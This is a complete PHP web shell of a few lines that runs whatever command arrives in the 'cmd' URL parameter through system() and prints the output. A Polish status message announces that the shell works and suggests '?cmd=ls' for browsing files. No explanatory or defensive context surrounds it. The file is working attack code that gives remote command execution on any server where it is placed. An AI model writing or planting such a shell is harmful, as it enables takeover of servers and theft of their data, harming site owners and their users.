<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "Shell działa! Użyj ?cmd=ls do przeglądania plików.";
}
?>
